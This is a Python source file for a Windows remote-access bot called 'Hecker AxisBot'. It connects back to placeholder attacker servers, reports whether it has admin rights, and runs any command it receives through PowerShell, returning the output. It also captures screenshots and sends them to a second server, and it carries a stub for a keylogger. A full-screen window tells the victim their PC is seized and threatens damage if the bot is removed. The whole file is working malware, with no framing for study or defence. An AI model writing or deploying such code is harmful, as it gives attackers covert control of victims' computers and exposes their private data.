import socket
import os
import subprocess
import time
import ctypes
import pynput
from tkinter import *
from PIL import ImageGrab
from termcolor import colored


ip = "ip for main server"
ip_ss = "ip for screenshot server"
port = port for main server
port_ss = port for screenshot server

class bot():
    def keylog(self):
        pass
    def main(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                s.connect((ip, port))
                so.connect((ip_ss, port_ss))
                if ctypes. windll. shell32. IsUserAnAdmin():
                    y = colored("\n[+]>> User is running the script as 'ADMIN'\n", "blue")
                    s.send(y.encode())
                else:
                    n = colored("\n[-]>> User is running the script as 'NON-ADMIN'\n", "red")
                    s.send(n.encode())
                break
            except socket.error:
                time.sleep(3)
        banner = (
                    "==========================================================\n"+
                    "|| MaDe bY?       -- Hecker                             ||\n"+
                    "|| HeLp?(help)    -- This command shows extra commands  || \n"+
                    "==========================================================\n")
        s.send(banner.encode())
        help_desk = ("=================================================\n"+
                     "|| 1.) bye    -- To close the session\n"+
                     "|| 2.) reconn -- To reconnect to the SS server.\n"+
                     "|| 3.) screen -- To take screenshot.\n"+
                     "=================================================\n")

        while True:
            shell = colored("\n[*] SHELL >>", "green")
            s.send(shell.encode())
            cmd = s.recv(1024).decode()
            if cmd[:3] == "cd ":
                cmd = cmd[:-1]
                try:
                    os.chdir(cmd[3:])
                except:
                    continue
            elif (cmd[:3] == "bye"):
                exit = "Bye...\n"
                s.send(exit.encode())
                s.close()
                so.close()
                break
            elif (cmd[:6] == "screen"):
                try:
                    image = ImageGrab.grab()
                    to_send = image.tobytes()
                    size = len(to_send)
                    so.send(bytes(str(size), 'utf-8'))
                    so.send(to_send)
                except:
                    final = colored("\n[-] Can't send command to screenshot...\n", "red")
                    s.send(final.encode())  
                    continue
            elif (cmd[:6] == "reconn"):
                try:
                    so.close()
                    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    so.connect((ip_ss, port_ss))
                except:
                    error = colored("\n[-] Can't connect again !\n", "red")
                    s.send(error.encode())
                    continue
            elif (cmd[:4] == "help"):
                s.send(help_desk.encode())
            else:
                main = "powershell " + cmd
                try:
                    result = subprocess.getoutput(main)
                except:
                    continue
                s.send(result.encode())


class gui():
    def body(self):
        a = bot()
        a.main()
        warning = (
                    "You can't make your PC/Laptop free from those Hackers\nYou have being seezed :)\n"+
                    "You even can't delete this BOT from your PC/Laptop.\nIf u try to do this your PC/Laptop will be QUITE forever :)\n"
                  )


        root = Tk()
        body = Label(root, text="Hecker AxisBot\nMade by :-",fg="white",bg="black", font=("Fira Code Light", 26))
        group = Label(root, text="DARK DEV's",fg="red",bg="black", font=("Chiller", 28))
        message = Label(root, text="Your PC/Laptop is now being controlled by a Indian Hacker.", fg="white", bg="red", font=("Fira Code Light", 18))
        message1 = Label(root, text=warning,fg="black",bg="red", font=("Chiller", 22, "bold"))
        note = Label(root, text="\nWARNING",fg="red",bg="black" ,font=("Chiller", 22, "bold"))
        info = Label(root, text="\nINFORMATION of Hecker AxisBot\nFrom India :)", fg="red", bg="black", font=("Chiller", 20, "bold"))

        #Display
        body.pack()
        group.pack()
        message.pack()
        note.pack()
        message1.pack()
        info.pack()
        

        root.title("Hecker AxisBot")
        root.configure(bg="black")
        root.geometry("1920x1080")
        root.mainloop()
        #enddd

main = gui()
main.body()
